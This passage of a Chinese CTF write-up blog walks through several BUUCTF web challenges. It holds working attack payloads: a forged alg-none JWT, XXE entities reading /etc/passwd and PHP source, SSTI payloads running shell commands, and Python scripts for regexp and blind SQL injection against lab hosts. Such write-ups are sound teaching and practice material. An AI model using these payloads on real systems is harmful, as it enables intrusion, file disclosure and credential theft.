crypto.<span class="hljs-title function_ invoke__">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_ invoke__">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secretid</span> = <span class="hljs-keyword">global</span>.secrets.length;<br>        <span class="hljs-keyword">global</span>.secrets.<span class="hljs-title function_ invoke__">push</span>(secret)<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = jwt.<span class="hljs-title function_ invoke__">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br> <br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br> <br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br> <br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br> <br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sid</span> = JSON.<span class="hljs-title function_ invoke__">parse</span>(Buffer.<span class="hljs-keyword">from</span>(token.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()).secretid;<br> <br>        console.<span class="hljs-title function_ invoke__">log</span>(sid)<br> <br>        <span class="hljs-keyword">if</span>(sid === undefined || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-keyword">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = <span class="hljs-keyword">global</span>.secrets[sid];<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">user</span> = jwt.<span class="hljs-title function_ invoke__">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">status</span> = username === user.username &amp;&amp; password === user.password;<br> <br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br> <br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            status<br>        &#125;);<br> <br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br> <br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">flag</span> = fs.<span class="hljs-title function_ invoke__">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            flag<br>        &#125;);<br> <br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br> <br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注册部分代码逻辑：</p><p>首先用户名不能为空且不能为<code>admin</code>用户，然后<code>secrets.length &gt; 100000</code>就置为空，可知当注册用户达到100000时就会清空原有密钥信息，下来的就是注册信息合法开始调用<code>jwt.sign()</code>进行JWT的生成，然后返回给用户，其中的密钥是随机生成的<code>crypto.randomBytes(18).toString(&#39;hex&#39;)</code>并与用户注册的sid进行绑定<code>const secretid = global.secrets.length;</code>，密钥的存储是在一个数组中，每当新增一个用户都会随机产生一个密钥进行存储。</p><p>登录部分代码逻辑：</p><p>首先用户名和密码不能为空，然后使用<code>JSON.parse()</code>对post的authorization字段进行提取sid，这个sid就是用户身份的唯一标志，依据逻辑<code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>可知sid不能为空并且sid需要大于等于0、小于密钥数组的实际长度，也就是说登录的用户在服务端需要能查出来，通过验证之后，下来由用户sid对global.secrets进行取值，也就是取得相应用户的密钥，然后进行用户验证，返回相应状态：验证成功的用户<code>status=true</code>否则为<code>false</code>。</p><p>简单来说，其代码逻辑可以看作数据库操作，通过用户标志查询数据库是否存在该用户记录，然后进行用户验证。</p><p>Getflag部分代码逻辑：其实就是验证登录用户是否为admin用户，普通用户会提示权限不足<code>throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);</code>。</p><p>Link: <a href="https://qftm.github.io/2020/04/19/bypass-nodejs-jwt/#toc-heading-7">https://qftm.github.io/2020/04/19/bypass-nodejs-jwt/#toc-heading-7</a></p><p>抓取登录数据包</p><p><img src="https://i0.imgs.ovh/2024/03/07/QUtYl.png" alt="image-20240308202610929"></p><p>jwt解密</p><p><img src="https://i0.imgs.ovh/2024/03/07/QUJrd.png" alt="image-20240308202727764"></p><p>知识点：由于Node的jsonwebtoken库存在一个缺陷，当用户传入jwt secretid为空时 jsonwebtoken会采用algorithm none进行解密，即便在登录验证代码部分<code>const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</code>后面的算法指名为 HS256，验证也还是按照 none 来验证通过的。</p><p>通过传入不存在的secretid，导致algorithm为none，由于algorithm&#x3D;none所以在构造JWT时就不需要提供密钥，然后就可以通过伪造jwt来成为admin。</p><p>但是，我们可以看到实际的Node.js代码中做了限制，当sid不满足<code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>条件时就会错误<code>APIError(&#39;login error&#39;, &#39;no such secret id&#39;);</code>，所以要想构造管理员权限的JWT，就要绕过这个sid限制。</p><p>分析sid限制绕过：</p><p>根据if条件可知，<code>sid === undefined || sid === null</code>这部分逻辑很容易绕过，主要是<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)</code>这部分。要绕过这部分，既要构造sid不存在又要满足<code>0-global.secrets.length</code>这个范围，所以这里可以利用Node.js的弱类型特性来绕过限制，比如十六进制字符串进行绕过：<code>&quot;0x0&quot;</code>（或者使用小数绕过<code>0.11</code>等）</p><p>伪造jwt</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> base64<br><br>a = <span class="hljs-string">&#x27;&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#x27;</span><br>b = <span class="hljs-string">&#x27;&#123;&quot;secretid&quot;:[],&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;,&quot;iat&quot;:1709900631&#125;&#x27;</span><br><span class="hljs-title function_">print</span>(base64.<span class="hljs-title function_">b64encode</span>(a.<span class="hljs-title function_">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br><span class="hljs-title function_">print</span>(base64.<span class="hljs-title function_">b64encode</span>(b.<span class="hljs-title function_">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY2MDg5NTk3M30.</p><p><img src="https://i0.imgs.ovh/2024/03/07/QUiyj.png" alt="image-20240308203217172"></p><p>放包，访问&#x2F;api&#x2F;flag得到flag</p><p><img src="https://i0.imgs.ovh/2024/03/07/QU5cV.png" alt="image-20240308203416784"></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>xxe漏洞</p><p>随便输入数据抓个包</p><p><img src="https://i0.imgs.ovh/2024/03/11/RsfCK.png" alt="image-20240312171620490"></p><p>抓到xml数据</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</p><p>palload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i0.imgs.ovh/2024/03/11/RxP8J.png" alt="image-20240312172425476"></p><p>php伪协议看看doLogin.php的源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">  */</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br><br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>账号密码可以登录，但没什么用</p><p>读取一个&#x2F;proc&#x2F;net&#x2F;arp文件</p><p><img src="https://i0.imgs.ovh/2024/03/11/Rx0tC.png" alt="image-20240312172734262">访问&#x2F;proc&#x2F;net&#x2F;arp文件时查看有无可利用内网主机等，然后通过爆破主机地址进行访问</p><p>用xxe内网探测存活的主机<br>两个ip都读取了<br>但是都显示504，正常应该报错然后再爆破最后一位<br>找了半天，说是由于buuctf转用了K8S管理，他的靶机容器是随机在80，81两个网段里的，具体情况看&#x2F;proc&#x2F;net&#x2F;fib_trie<br><img src="https://i0.imgs.ovh/2024/03/11/Rxs7N.png" alt="image-20240312172839208"></p><p><img src="https://i0.imgs.ovh/2024/03/11/RxxDR.png" alt="image-20240312173003136"></p><p><img src="https://i0.imgs.ovh/2024/03/11/RxbZp.png" alt="image-20240312173032756"></p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="https://i0.imgs.ovh/2024/03/14/cEVIA.png" alt="img"></p><p>fuzz测试中大部分字符被过滤</p><p>用dirsearch扫描，发现robots.txt</p><p><img src="https://i0.imgs.ovh/2024/03/14/cEFRU.png" alt="image-20240315193347004"></p><p>hint.txt</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$black_list</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|<span class="hljs-subst">\&#x27;</span>|=| |in|&lt;|&gt;|-|\.|<span class="hljs-subst">\(\)</span>|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br><span class="hljs-type">If</span> <span class="hljs-variable">$_POST</span>[&#x27;passwd&#x27;] <span class="hljs-operator">===</span> admin&#x27;s password,<br><br><span class="hljs-type">Then</span> you will <span class="hljs-keyword">get</span> the flag;<br></code></pre></td></tr></table></figure><p>regexp注入（正则注入）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>单引号被禁用，使用 \ 转义and前面的那个单引号，使得 ‘’ and passwd&#x3D;’ 形成闭合</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=\&amp;passwd=||sql<span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure><p>因为题目过滤掉了空格，空格能用内联注释符&#x2F;**&#x2F;代替</p><p>注释符#和–  被过滤掉了，这里用;%00截断注释后面的内容</p><p>不能在输入框直接提交，会被url encode 变为%2500被黑名单拦截</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&#x27;||sql;%00&#x27;</span><br></code></pre></td></tr></table></figure><p>即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">sql</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>利用正则进行注入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">username=\&amp;passwd=||<span class="hljs-regexp">/**/</span>passwd<span class="hljs-regexp">/**/</span>regexp<span class="hljs-regexp">/**/</span><span class="hljs-string">&quot;^x&quot;</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">select * from users where <span class="hljs-regexp">/**/</span>passwd<span class="hljs-regexp">/**/</span>regexp<span class="hljs-regexp">/**/</span><span class="hljs-string">&quot;^x&quot;</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>匹配正确的话会返回alert()</p><p>用python脚本进行爆破</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vim">#buuctf web [NCTF2019]SQLi<br>import requests<br>import <span class="hljs-built_in">string</span><br><br><br>url = <span class="hljs-string">&quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&quot;</span><br>pw_fuzz = <span class="hljs-built_in">string</span>.ascii_lowercase + <span class="hljs-built_in">string</span>.digits + <span class="hljs-string">&quot;_&quot;</span>      #密码字典：小写字母和数字还有下划线<br><span class="hljs-keyword">pw</span> = <span class="hljs-string">&quot;&quot;</span>     #admin的密码<br><br><span class="hljs-keyword">while</span> True:<br>    <span class="hljs-keyword">for</span> i in pw_fuzz:<br>        data=&#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.format((<span class="hljs-keyword">pw</span>+i))<br>        &#125;<br>        <span class="hljs-keyword">res</span> = requests.post(url=url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;alert&quot;</span> not in <span class="hljs-keyword">res</span>:<br>            <span class="hljs-keyword">pw</span> = <span class="hljs-keyword">pw</span> + i<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">pw</span>)<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">you_will_never_know<span class="hljs-number">7788990</span><br></code></pre></td></tr></table></figure><p>用admin登录获取flag</p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>可见flask，盲猜ssti</p><p><img src="https://i0.imgs.ovh/2024/03/16/e2vNK.png" alt="image-20240317194543381"></p><p>用Arjun跑一下发现参数name<img src="https://i0.imgs.ovh/2024/03/16/eFP7j.png" alt="image-20240317194648467"></p><p>通过下图判断为Jinja2模板</p><p>dfu</p><p>法1：可以使用tplmap工具直接得到getshell权限</p><p>法2：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>法3：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔盲注</p><p><img src="https://i0.imgs.ovh/2024/03/21/gXR60.png" alt="image-20240322221805225"></p><p>输入1有回显 Hi admin, your score is: 100</p><p>最多到4</p><p>测试发现空格被过滤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>     <span class="hljs-comment">#Hi admin, your score is: 100</span><br><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">0</span>     <span class="hljs-comment">#student number not exists.</span><br></code></pre></td></tr></table></figure><p>发现回显可以利用</p><p>用二分脚本注入，注意加sleep（）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># payload = f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            payload = <span class="hljs-string">f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            url = <span class="hljs-string">f&quot;http://14923311-8407-4f70-8f44-eb198e94d0b7.node5.buuoj.cn:81/?stunum=<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span><br><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>                time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 